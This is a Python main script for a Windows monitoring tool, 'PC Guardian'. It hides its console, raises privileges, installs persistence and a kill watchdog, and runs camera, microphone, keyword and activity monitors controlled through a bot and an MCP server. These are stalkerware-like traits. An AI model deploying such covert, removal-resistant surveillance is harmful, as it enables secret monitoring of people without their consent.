"""
PC Guardian — Main Entry Point
Real privileges, real protection, real encryption.
"""

import sys
import os
import ctypes
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

CONFIG_PATH  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config", "config.enc")
SETUP_FLAG   = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".setup_done")
INSTALL_FLAG = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".installed")


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def needs_setup() -> bool:
    return not os.path.exists(CONFIG_PATH) or not os.path.exists(SETUP_FLAG)


def start_guardian():
    from config.config import Config
    from logs.logger import setup_logger
    from core.lock_engine import LockEngine
    from core.keyword_listener import KeywordListener
    from monitor.activity import ActivityMonitor
    from monitor.behavior import BehaviorMonitor
    from monitor.reporter import Reporter
    from scheduler.schedule_engine import ScheduleEngine
    from av.camera import CameraSystem
    from av.microphone import MicrophoneSystem
    from av.speaker import SpeakerSystem
    from bot.bot import GuardianBot
    from protection.tamper_detect import TamperDetect

    logger = setup_logger("main")

    # ── Step 1: Real privileges ───────────────────────────────────────────────
    try:
        from privilege import full_privilege_setup
        full_privilege_setup()
    except Exception as e:
        logger.warning(f"Privilege setup: {e}")

    # ── Step 2: Install protection once ──────────────────────────────────────
    if not os.path.exists(INSTALL_FLAG):
        try:
            from protection import full_install
            full_install()
        except Exception as e:
            logger.warning(f"Protection install: {e}")
        try:
            from core.startup import install_all
            install_all()
        except Exception as e:
            logger.warning(f"Startup install: {e}")
        # Start kill watchdog
        try:
            from exe_guard import start_kill_watchdog, GUARDED_PATH, ENCRYPTED_EXT
            enc_path = GUARDED_PATH + ENCRYPTED_EXT
            if os.path.exists(enc_path):
                start_kill_watchdog(enc_path)
        except Exception as e:
            logger.warning(f"Kill watchdog: {e}")

        with open(INSTALL_FLAG, "w") as f:
            f.write("1")

    # ── Step 3: Load config and systems ──────────────────────────────────────
    cfg         = Config.load()
    lock_engine = LockEngine(cfg)
    speaker     = SpeakerSystem(cfg)
    camera      = CameraSystem(cfg)
    mic         = MicrophoneSystem(cfg, lock_engine)
    activity    = ActivityMonitor(cfg)
    behavior    = BehaviorMonitor(cfg, lock_engine, mic)
    reporter    = Reporter(cfg, activity)
    scheduler   = ScheduleEngine(cfg, lock_engine)
    tamper      = TamperDetect(cfg)

    # ── Step 4: MCP server ───────────────────────────────────────────────────
    try:
        import mcp_server
        mcp_server.init(cfg, lock_engine, camera, mic, speaker, activity)
        mcp_server.start_mcp_thread()
    except Exception as e:
        logger.warning(f"MCP: {e}")

    # ── Step 5: Bot ──────────────────────────────────────────────────────────
    bot = GuardianBot(
        cfg=cfg, lock_engine=lock_engine, camera=camera,
        mic=mic, speaker=speaker, activity=activity, scheduler=scheduler,
    )

    # ── Step 6: Background threads ───────────────────────────────────────────
    threads = [
        threading.Thread(target=activity.start,  daemon=True, name="Activity"),
        threading.Thread(target=behavior.start,  daemon=True, name="Behavior"),
        threading.Thread(target=scheduler.start, daemon=True, name="Scheduler"),
        threading.Thread(target=reporter.start,  daemon=True, name="Reporter"),
        threading.Thread(target=tamper.start,    daemon=True, name="Tamper"),
        threading.Thread(
            target=KeywordListener(cfg, lock_engine).start,
            daemon=True, name="Keyword"
        ),
    ]
    for t in threads:
        t.start()

    logger.info("PC Guardian fully operational.")
    bot.run()


if __name__ == "__main__":
    if "--change" in sys.argv:
        from first_run import change_credentials
        change_credentials()
        sys.exit(0)

    if "--uninstall" in sys.argv:
        pw = sys.argv[2] if len(sys.argv) > 2 else ""
        from protection import remove_protection
        ok, msg = remove_protection(pw)
        print(msg)
        sys.exit(0 if ok else 1)

    if "--install-service" in sys.argv:
        from core.service import install_service
        install_service()
        sys.exit(0)

    if needs_setup():
        from first_run import run_first_setup
        run_first_setup()

    hide_console()
    start_guardian()
